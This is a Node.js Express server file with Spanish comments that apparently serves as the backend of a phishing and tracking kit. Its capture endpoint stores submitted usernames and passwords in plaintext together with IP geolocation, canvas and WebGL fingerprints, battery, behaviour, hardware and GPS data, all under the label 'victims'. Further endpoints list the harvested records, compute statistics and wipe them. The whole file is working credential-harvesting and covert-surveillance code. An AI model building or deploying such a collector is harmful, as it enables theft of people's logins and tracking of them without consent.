const express = require('express');
const cors = require('cors');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' })); // Aumentar límite para fingerprints
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Archivo para guardar víctimas
const DATA_FILE = path.join(__dirname, 'data', 'victims.json');

// Crear directorio data si no existe
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}

// Inicializar archivo si no existe
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// Funciones helper
function getVictims() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
}

function saveVictim(victim) {
    const victims = getVictims();
    victims.push(victim);
    fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
}

// Generar fingerprint único del dispositivo
function generateFingerprint(ip, userAgent, canvas, webgl) {
    const data = `${ip}-${userAgent}-${canvas}-${webgl}`;
    return crypto.createHash('md5').update(data).digest('hex');
}

// Verificar si el dispositivo ya fue capturado
function isAlreadyCaptured(fingerprint) {
    const victims = getVictims();
    return victims.some(v => v.fingerprint === fingerprint);
}

// Parsear User Agent para extraer más info
function parseUserAgent(ua) {
    const parser = {
        browser: 'Unknown',
        browserVersion: 'Unknown',
        os: 'Unknown',
        osVersion: 'Unknown',
        device: 'Desktop',
        deviceModel: 'Unknown'
    };
    
    if (!ua) return parser;
    
    // Navegador
    if (ua.includes('Chrome/')) {
        parser.browser = 'Chrome';
        parser.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Firefox/')) {
        parser.browser = 'Firefox';
        parser.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
        parser.browser = 'Safari';
        parser.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Edge/')) {
        parser.browser = 'Edge';
        parser.browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || 'Unknown';
    }
    
    // Sistema Operativo
    if (ua.includes('Windows NT')) {
        parser.os = 'Windows';
        const version = ua.match(/Windows NT ([\d.]+)/)?.[1];
        const versions = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
        parser.osVersion = versions[version] || version || 'Unknown';
    } else if (ua.includes('Mac OS X')) {
        parser.os = 'macOS';
        parser.osVersion = ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown';
    } else if (ua.includes('Android')) {
        parser.os = 'Android';
        parser.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown';
        parser.device = 'Mobile';
    } else if (ua.includes('iPhone') || ua.includes('iPad')) {
        parser.os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
        parser.osVersion = ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown';
        parser.device = ua.includes('iPad') ? 'Tablet' : 'Mobile';
    } else if (ua.includes('Linux')) {
        parser.os = 'Linux';
    }
    
    // Modelo del dispositivo
    if (ua.includes('iPhone')) {
        parser.deviceModel = ua.match(/(iPhone[\w\s]+)/)?.[1] || 'iPhone';
    } else if (ua.includes('iPad')) {
        parser.deviceModel = ua.match(/(iPad[\w\s]+)/)?.[1] || 'iPad';
    } else if (ua.includes('Android')) {
        const model = ua.match(/\(([^)]+)\)/)?.[1];
        if (model) {
            const parts = model.split(';');
            parser.deviceModel = parts[parts.length - 1]?.trim() || 'Android Device';
        }
    }
    
    return parser;
}

// 🎯 ENDPOINT PRINCIPAL: Capturar datos avanzados
app.post('/api/capture', (req, res) => {
    // Obtener IP real
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress;
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const canvas = req.body.fingerprints?.canvas || '';
    const webgl = req.body.fingerprints?.webgl || '';
    
    // Generar fingerprint único
    const fingerprint = generateFingerprint(ip, userAgent, canvas, webgl);
    
    // Verificar duplicados
    if (isAlreadyCaptured(fingerprint)) {
        console.log('⚠️  Dispositivo duplicado ignorado:', ip);
        return res.json({ 
            success: false, 
            message: 'Dispositivo ya capturado',
            duplicate: true
        });
    }
    
    const geo = geoip.lookup(ip);
    const uaInfo = parseUserAgent(userAgent);
    
    const victimData = {
        // ═══════════════════════════════════════
        // 📝 DATOS BÁSICOS
        // ═══════════════════════════════════════
        username: req.body.username || 'Visitor',
        password: req.body.password || 'N/A',
        fingerprint: fingerprint,
        timestamp: new Date().toISOString(),
        referrer: req.headers.referer || 'Direct',
        url: req.body.url || 'Unknown',
        
        // ═══════════════════════════════════════
        // 🌐 RED E IP
        // ═══════════════════════════════════════
        network: {
            ip: ip,
            country: geo?.country || 'Unknown',
            city: geo?.city || 'Unknown',
            region: geo?.region || 'Unknown',
            timezone: geo?.timezone || req.body.network?.timezone || 'Unknown',
            isp: 'Unknown', // Requiere servicio externo
            connectionType: req.body.network?.effectiveType || 'Unknown',
            downlink: req.body.network?.downlink || 'Unknown',
            rtt: req.body.network?.rtt || 'Unknown',
            saveData: req.body.network?.saveData || false
        },
        
        // ═══════════════════════════════════════
        // 📱 DISPOSITIVO
        // ═══════════════════════════════════════
        device: {
            type: uaInfo.device,
            model: uaInfo.deviceModel,
            vendor: req.body.device?.vendor || 'Unknown',
            platform: req.body.device?.platform || 'Unknown',
            architecture: req.body.device?.architecture || 'Unknown',
            cpuCores: req.body.device?.cpuCores || 'Unknown',
            memory: req.body.device?.memory || 'Unknown',
            maxTouchPoints: req.body.device?.maxTouchPoints || 0,
            touchSupport: (req.body.device?.maxTouchPoints || 0) > 0
        },
        
        // ═══════════════════════════════════════
        // 💻 SISTEMA OPERATIVO
        // ═══════════════════════════════════════
        os: {
            name: uaInfo.os,
            version: uaInfo.osVersion,
            platform: req.body.device?.platform || 'Unknown'
        },
        
        // ═══════════════════════════════════════
        // 🌐 NAVEGADOR
        // ═══════════════════════════════════════
        browser: {
            name: uaInfo.browser,
            version: uaInfo.browserVersion,
            userAgent: userAgent,
            language: req.body.browser?.language || 'Unknown',
            languages: req.body.browser?.languages || [],
            cookiesEnabled: req.body.browser?.cookiesEnabled || false,
            doNotTrack: req.body.browser?.doNotTrack || 'Unknown',
            plugins: req.body.browser?.plugins || [],
            onLine: req.body.browser?.onLine !== false
        },
        
        // ═══════════════════════════════════════
        // 🖥️ PANTALLA
        // ═══════════════════════════════════════
        screen: {
            resolution: req.body.screen?.resolution || 'Unknown',
            availResolution: req.body.screen?.availResolution || 'Unknown',
            colorDepth: req.body.screen?.colorDepth || 'Unknown',
            pixelDepth: req.body.screen?.pixelDepth || 'Unknown',
            orientation: req.body.screen?.orientation || 'Unknown',
            pixelRatio: req.body.screen?.pixelRatio || 1
        },
        
        // ═══════════════════════════════════════
        // 🔋 BATERÍA
        // ═══════════════════════════════════════
        battery: {
            level: req.body.battery?.level || 'Unknown',
            charging: req.body.battery?.charging || false,
            chargingTime: req.body.battery?.chargingTime || 'Unknown',
            dischargingTime: req.body.battery?.dischargingTime || 'Unknown'
        },
        
        // ═══════════════════════════════════════
        // 🎨 GRÁFICOS Y FINGERPRINTS
        // ═══════════════════════════════════════
        fingerprints: {
            canvas: req.body.fingerprints?.canvas || 'Unknown',
            webgl: req.body.fingerprints?.webgl || 'Unknown',
            webglVendor: req.body.fingerprints?.webglVendor || 'Unknown',
            webglRenderer: req.body.fingerprints?.webglRenderer || 'Unknown',
            fonts: req.body.fingerprints?.fonts || []
        },
        
        // ═══════════════════════════════════════
        // 🔐 PRIVACIDAD Y STORAGE
        // ═══════════════════════════════════════
        privacy: {
            doNotTrack: req.body.browser?.doNotTrack || 'Unknown',
            cookiesEnabled: req.body.browser?.cookiesEnabled || false,
            localStorageAvailable: req.body.privacy?.localStorage || false,
            sessionStorageAvailable: req.body.privacy?.sessionStorage || false,
            indexedDBAvailable: req.body.privacy?.indexedDB || false
        },
        
        // ═══════════════════════════════════════
        // 🖱️ COMPORTAMIENTO
        // ═══════════════════════════════════════
        behavior: {
            mouseMovements: req.body.behavior?.mouseMovements || 0,
            clicks: req.body.behavior?.clicks || 0,
            keyPresses: req.body.behavior?.keyPresses || 0,
            scrollDepth: req.body.behavior?.scrollDepth || 0,
            timeOnPage: req.body.behavior?.timeOnPage || 0
        },
        
        // ═══════════════════════════════════════
        // 📸 HARDWARE (Sin permisos)
        // ═══════════════════════════════════════
        hardware: {
            videoInputs: req.body.hardware?.videoInputs || 'Unknown',
            audioInputs: req.body.hardware?.audioInputs || 'Unknown',
            audioOutputs: req.body.hardware?.audioOutputs || 'Unknown'
        },
        
        // ═══════════════════════════════════════
        // 📡 SENSORES (Si disponibles sin permiso)
        // ═══════════════════════════════════════
        sensors: {
            accelerometer: req.body.sensors?.accelerometer || false,
            gyroscope: req.body.sensors?.gyroscope || false,
            magnetometer: req.body.sensors?.magnetometer || false
        },
        
        // ═══════════════════════════════════════
        // 🌍 GEOLOCALIZACIÓN (Solo si dan permiso)
        // ═══════════════════════════════════════
        geolocation: {
            latitude: req.body.geolocation?.latitude || null,
            longitude: req.body.geolocation?.longitude || null,
            accuracy: req.body.geolocation?.accuracy || null,
            altitude: req.body.geolocation?.altitude || null,
            altitudeAccuracy: req.body.geolocation?.altitudeAccuracy || null
        }
    };
    
    // Guardar
    saveVictim(victimData);
    
    // Log mejorado
    console.log('🎯 Nueva víctima capturada:');
    console.log(`   👤 ${victimData.username}`);
    console.log(`   🌐 ${victimData.network.ip} | ${victimData.network.city}, ${victimData.network.country}`);
    console.log(`   📱 ${victimData.device.type} | ${victimData.os.name} ${victimData.os.version}`);
    console.log(`   🌐 ${victimData.browser.name} ${victimData.browser.version}`);
    
    res.json({ 
        success: true, 
        message: 'Datos capturados correctamente',
        duplicate: false
    });
});

// 📊 ENDPOINT: Ver todas las víctimas
app.get('/api/victims', (req, res) => {
    const victims = getVictims();
    res.json(victims);
});

// 📈 ENDPOINT: Estadísticas mejoradas
app.get('/api/stats', (req, res) => {
    const victims = getVictims();
    
    const stats = {
        total: victims.length,
        lastCapture: victims.length > 0 ? victims[victims.length - 1].timestamp : null,
        countries: [...new Set(victims.map(v => v.network?.country || 'Unknown'))].length,
        cities: [...new Set(victims.map(v => v.network?.city || 'Unknown'))].length,
        browsers: [...new Set(victims.map(v => v.browser?.name || 'Unknown'))],
        devices: {
            mobile: victims.filter(v => v.device?.type === 'Mobile').length,
            tablet: victims.filter(v => v.device?.type === 'Tablet').length,
            desktop: victims.filter(v => v.device?.type === 'Desktop').length
        },
        os: [...new Set(victims.map(v => v.os?.name || 'Unknown'))]
    };
    
    res.json(stats);
});

// 🗑️ ENDPOINT: Limpiar datos
app.delete('/api/clear', (req, res) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    res.json({ success: true, message: 'Datos eliminados' });
});

// 🏠 Ruta raíz
app.get('/', (req, res) => {
    res.json({ 
        status: 'Server activo ✅',
        victims: getVictims().length,
        version: '2.0 - Enhanced',
        features: [
            'Advanced fingerprinting',
            'Network info',
            'Battery status',
            'Device detection',
            'Behavior tracking',
            'Canvas & WebGL',
            'Hardware enumeration'
        ],
        endpoints: {
            capture: 'POST /api/capture',
            victims: 'GET /api/victims',
            stats: 'GET /api/stats',
            clear: 'DELETE /api/clear'
        }
    });
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📊 Total víctimas: ${getVictims().length}`);
    console.log(`🛡️  Anti-duplicados: ACTIVO`);
    console.log(`🔬 Fingerprinting avanzado: ACTIVO`);
});